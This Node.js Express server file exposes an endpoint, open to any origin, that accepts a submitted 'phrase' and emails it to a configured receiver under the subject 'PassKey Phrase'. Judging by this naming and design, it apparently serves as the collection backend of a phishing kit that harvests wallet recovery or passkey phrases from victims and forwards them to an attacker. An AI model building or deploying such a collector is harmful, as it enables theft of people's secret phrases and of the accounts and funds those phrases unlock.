// server.js
import express from "express";
import nodemailer from "nodemailer";
import bodyParser from "body-parser";
import dotenv from "dotenv"
import cors from "cors"

dotenv.config()

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON

app.use(cors())
app.use(bodyParser.json());

// Configure transporter (use your SMTP settings)
const transporter = nodemailer.createTransport({
  service: "gmail", // or use host, port, secure for custom SMTP
  auth: {
    user: process.env.EMAIL_USER, // your email
    pass: process.env.EMAIL_PASS, // your email password or app password
  },
});

// POST endpoint to forward phrase
app.post("/send", async (req, res) => {
  try {
    const { phrase } = req.body;

    if (!phrase) {
      return res.status(400).json({ error: "Phrase is required" });
    }

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.RECEIVER_MAIL, // change to target recipient
      subject: "PassKey Phrase",
      text: `Received phrase: ${phrase}`,
    };

    await transporter.sendMail(mailOptions);

    res.json({ success: true, message: "Email sent successfully" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to send email" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
